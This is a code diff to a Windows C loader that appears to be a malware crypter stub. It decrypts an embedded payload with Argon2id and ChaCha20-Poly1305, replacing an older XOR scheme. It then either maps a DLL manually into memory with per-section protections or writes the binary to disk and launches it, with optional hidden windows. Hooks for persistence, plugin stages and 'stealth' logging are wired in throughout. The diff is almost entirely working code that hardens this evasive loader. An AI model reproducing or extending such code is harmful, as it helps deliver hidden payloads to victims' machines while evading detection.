@@ -23,9 +23,11 @@
 #include <windows.h>
 #include <string.h>
 #include <stdio.h>
+#include <stddef.h>
 #include <tlhelp32.h>
 #include "persistence.h"
 #include "plugin.h"
+#include "crypto.h"
 // Prototype for plugin loader (implemented in plugin_loader.c)
 int plugin_loader_init(const char *key_hex);
 int plugin_fire_stage(int stage);
@@ -37,6 +39,12 @@ int plugin_fire_stage(int stage);
 HMODULE g_hDll = NULL;
 // Named event handle to allow cooperative shutdown (can be signaled externally)
 HANDLE g_exit_event = NULL;
+
+static void secure_zero(void *ptr, size_t len) {
+    if (ptr && len) {
+        SecureZeroMemory(ptr, len);
+    }
+}
 
 // Simple debug appender to %TEMP%\stealth_debug.log (no-op unless ENABLE_FILE_LOGS defined)
 #ifdef ENABLE_FILE_LOGS
@@ -240,6 +248,34 @@ HMODULE LoadDllInMemory(void *dll_data, DWORD dll_size) {
         VirtualFree(imageBase, 0, MEM_RELEASE);
         return NULL;
     }
+    // Apply per-section protections after relocations/import resolution
+    DWORD oldProt = 0;
+    // Protect headers as read-only
+    VirtualProtect(imageBase, ntHeader->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &oldProt);
+    section = IMAGE_FIRST_SECTION(ntHeader);
+    for (DWORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
+        SIZE_T raw_size = section[i].SizeOfRawData;
+        SIZE_T virt_size = section[i].Misc.VirtualSize;
+        SIZE_T size_to_protect = virt_size ? virt_size : raw_size;
+        if (size_to_protect == 0) continue;
+        DWORD characteristics = section[i].Characteristics;
+        DWORD protect = PAGE_NOACCESS;
+        int is_exec = (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
+        int is_write = (characteristics & IMAGE_SCN_MEM_WRITE) != 0;
+        int is_read = (characteristics & IMAGE_SCN_MEM_READ) != 0;
+        if (is_exec && is_write) protect = PAGE_EXECUTE_READWRITE;
+        else if (is_exec && is_read) protect = PAGE_EXECUTE_READ;
+        else if (is_exec) protect = PAGE_EXECUTE;
+        else if (is_write) protect = PAGE_READWRITE;
+        else if (is_read) protect = PAGE_READONLY;
+        else protect = PAGE_NOACCESS;
+        LPVOID sec_addr = (BYTE*)imageBase + section[i].VirtualAddress;
+        if (!VirtualProtect(sec_addr, size_to_protect, protect, &oldProt)) {
+            VirtualFree(imageBase, 0, MEM_RELEASE);
+            return NULL;
+        }
+    }
+
     if (!dllMain((HMODULE)imageBase, DLL_PROCESS_ATTACH, NULL)) {
         VirtualFree(imageBase, 0, MEM_RELEASE);
         return NULL;
@@ -330,6 +366,11 @@ int main(int argc, char *argv[]) {
     }
 
     typedef struct {
+        char magic[4];
+        uint16_t version;
+        uint16_t reserved;
+    } PayloadHeader;
+    typedef struct {
         char key_hex[65];
         unsigned char persistence;
         unsigned int junk_url_count;
@@ -337,7 +378,23 @@ int main(int argc, char *argv[]) {
         unsigned char load_in_memory;
         unsigned char payload_data[1];
     } PayloadConfig;
-    PayloadConfig *config = (PayloadConfig *)lpData;
+    if (bytesRead < sizeof(PayloadHeader) + offsetof(PayloadConfig, payload_data)) {
+        write_debug("config header too small");
+        ret = 1;
+        goto cleanup;
+    }
+    PayloadHeader *hdr = (PayloadHeader *)lpData;
+    {
+        char dbg_hdr[128];
+        snprintf(dbg_hdr, sizeof(dbg_hdr), "CONFIG header: magic=%02X %02X %02X %02X version=%u bytesRead=%lu", (unsigned char)hdr->magic[0], (unsigned char)hdr->magic[1], (unsigned char)hdr->magic[2], (unsigned char)hdr->magic[3], (unsigned)hdr->version, (unsigned long)bytesRead);
+        write_debug(dbg_hdr);
+    }
+    if (memcmp(hdr->magic, "STCF", 4) != 0 || hdr->version != 1) {
+        write_debug("config header invalid magic/version");
+        ret = 1;
+        goto cleanup;
+    }
+    PayloadConfig *config = (PayloadConfig *)((unsigned char *)lpData + sizeof(PayloadHeader));
     // Log config summary for diagnostics
     {
         char dbg[256];
@@ -348,6 +405,12 @@ int main(int argc, char *argv[]) {
     int load_in_memory = (config->load_in_memory == 1);
     unsigned long long payload_size = config->payload_size;
     unsigned char *encrypted_payload = config->payload_data;
+    size_t stored_len = bytesRead - sizeof(PayloadHeader) - offsetof(PayloadConfig, payload_data);
+    if (payload_size > stored_len) {
+        write_debug("config payload_size exceeds stored length");
+        ret = 1;
+        goto cleanup;
+    }
 
     {
         PersistenceOpts opts = {0};
@@ -370,25 +433,75 @@ int main(int argc, char *argv[]) {
     plugin_fire_stage(PLUGIN_STAGE_PRELAUNCH);
 
     if (!load_in_memory) {
-        unsigned char key[32];
-        hex_to_bytes(config->key_hex, key, 32);
-        decrypted_payload = malloc(payload_size);
-        if (!decrypted_payload) {
+        {
+            char dbg[128];
+            snprintf(dbg, sizeof(dbg), "disk-mode stored_len=%zu bytesRead=%lu", stored_len, (unsigned long)bytesRead);
+            write_debug(dbg);
+        }
+        if (stored_len < sizeof(CryptoEnvelope)) {
+            write_debug("stored_len too small for envelope");
             ret = 1;
             goto cleanup;
         }
-        memcpy(decrypted_payload, encrypted_payload, payload_size);
-        for (unsigned long long i = 0; i < payload_size; i++) {
-            decrypted_payload[i] ^= key[i % 32];
+        CryptoEnvelope env;
+        memcpy(&env, encrypted_payload, sizeof(env));
+        if (env.version != CRYPTO_VERSION) {
+            write_debug("config crypto version mismatch");
+            ret = 1;
+            goto cleanup;
         }
+        size_t ciphertext_len = stored_len - sizeof(CryptoEnvelope);
+        if (ciphertext_len != (size_t)payload_size || env.ciphertext_len != (size_t)payload_size) {
+            write_debug("ciphertext length mismatch");
+            ret = 1;
+            goto cleanup;
+        }
+        const uint8_t *ciphertext = encrypted_payload + sizeof(CryptoEnvelope);
+        CryptoEnvelope env_use = env;
+        env_use.ciphertext = ciphertext;
+        env_use.ciphertext_len = ciphertext_len;
+        decrypted_payload = malloc(ciphertext_len);
+        if (!decrypted_payload) {
+            write_debug("malloc decrypted_payload failed");
+            ret = 1;
+            goto cleanup;
+        }
+        uint8_t key[CRYPTO_KEY_LEN];
+        if (crypto_argon2id_derive((const uint8_t *)config->key_hex, strlen(config->key_hex), env_use.salt, CRYPTO_SALT_LEN, env_use.t_cost, env_use.m_cost_kib, env_use.parallelism, key, sizeof(key)) != 0) {
+            write_debug("argon2id derive failed");
+            secure_zero(key, sizeof(key));
+            ret = 1;
+            goto cleanup;
+        }
+        if (crypto_chacha20_poly1305_decrypt(ciphertext, ciphertext_len, key, NULL, 0, &env_use, decrypted_payload) != 0) {
+            write_debug("chacha20 decrypt failed");
+            secure_zero(key, sizeof(key));
+            ret = 1;
+            goto cleanup;
+        }
+        secure_zero(key, sizeof(key));
 
-            char bin_path[PATH_BUF_LEN];
-            GetModuleFileNameA(NULL, bin_path, PATH_BUF_LEN);
-        char *bin_name = strrchr(bin_path, '\\') ? strrchr(bin_path, '\\') + 1 : bin_path;
-            char decrypted_path[PATH_BUF_LEN];
-            snprintf(decrypted_path, PATH_BUF_LEN, "decrypted_%s", bin_name);
+        char bin_path[PATH_BUF_LEN];
+        GetModuleFileNameA(NULL, bin_path, PATH_BUF_LEN);
+        // Build an absolute decrypted path next to the stub to avoid CWD surprises
+        char decrypted_path[PATH_BUF_LEN];
+        char *last_sep = strrchr(bin_path, '\\');
+        if (last_sep) {
+            size_t dir_len = (size_t)(last_sep - bin_path);
+            if (dir_len >= PATH_BUF_LEN - 1) dir_len = PATH_BUF_LEN - 2;
+            memcpy(decrypted_path, bin_path, dir_len);
+            decrypted_path[dir_len] = '\\';
+            decrypted_path[dir_len + 1] = '\0';
+            const char *bin_name = last_sep + 1;
+            char suffix[PATH_BUF_LEN];
+            snprintf(suffix, sizeof(suffix), "decrypted_%s", bin_name);
+            strncat(decrypted_path, suffix, PATH_BUF_LEN - strlen(decrypted_path) - 1);
+        } else {
+            snprintf(decrypted_path, PATH_BUF_LEN, "decrypted_%s", bin_path);
+        }
         HANDLE hFile = CreateFileA(decrypted_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
         if (hFile == INVALID_HANDLE_VALUE) {
+            char dbg2[256]; snprintf(dbg2, sizeof(dbg2), "CreateFile failed for %s err=%lu", decrypted_path, GetLastError()); write_debug(dbg2);
             ret = 1;
             goto cleanup;
         }
@@ -404,17 +517,36 @@ int main(int argc, char *argv[]) {
         PROCESS_INFORMATION pi;
         memset(&si, 0, sizeof(si));
         si.cb = sizeof(si);
-        // Request hidden window for the child process
-        si.dwFlags = STARTF_USESHOWWINDOW;
-        si.wShowWindow = SW_HIDE;
-        // Debug log: attempt CreateProcess
+        // Visibility policy:
+        // - Default: show the payload window (to surface UI payloads like message boxes).
+        // - Set STEALTH_HIDE_PAYLOAD=1 to keep it hidden.
+        // - STEALTH_SHOW_PAYLOAD=1 also forces shown (back-compat flag from earlier).
+        const char *show_env = getenv("STEALTH_SHOW_PAYLOAD");
+        const char *hide_env = getenv("STEALTH_HIDE_PAYLOAD");
+        int force_show = (show_env && show_env[0] == '1');
+        int force_hide = (hide_env && hide_env[0] == '1');
+        if (force_hide) {
+            si.dwFlags = STARTF_USESHOWWINDOW;
+            si.wShowWindow = SW_HIDE;
+        } else {
+            si.dwFlags = STARTF_USESHOWWINDOW;
+            si.wShowWindow = SW_SHOWNORMAL;
+        }
+        // Debug log: attempt CreateProcess (absolute path)
         char dbgmsg[1024];
         snprintf(dbgmsg, sizeof(dbgmsg), "Attempting CreateProcess: %s", decrypted_path);
         write_debug(dbgmsg);
         // Fire PRELAUNCH again just before launching (in case plugins were staged earlier)
         plugin_fire_stage(PLUGIN_STAGE_PRELAUNCH);
-        DWORD creationFlags = CREATE_NO_WINDOW;
-        if (!CreateProcessA(decrypted_path, NULL, NULL, NULL, FALSE, creationFlags, NULL, NULL, &si, &pi)) {
+        DWORD creationFlags = 0;
+        if (force_hide) creationFlags = CREATE_NO_WINDOW;
+        // Set current-directory for child to the stub directory (so relative resources work)
+        char child_cwd[PATH_BUF_LEN];
+        strncpy(child_cwd, bin_path, PATH_BUF_LEN);
+        char *cwd_sep = strrchr(child_cwd, '\\');
+        if (cwd_sep) *cwd_sep = '\0';
+
+        if (!CreateProcessA(decrypted_path, NULL, NULL, NULL, FALSE, creationFlags, NULL, child_cwd, &si, &pi)) {
             snprintf(dbgmsg, sizeof(dbgmsg), "CreateProcess failed: %lu", GetLastError());
             write_debug(dbgmsg);
             // Signal plugins about failure
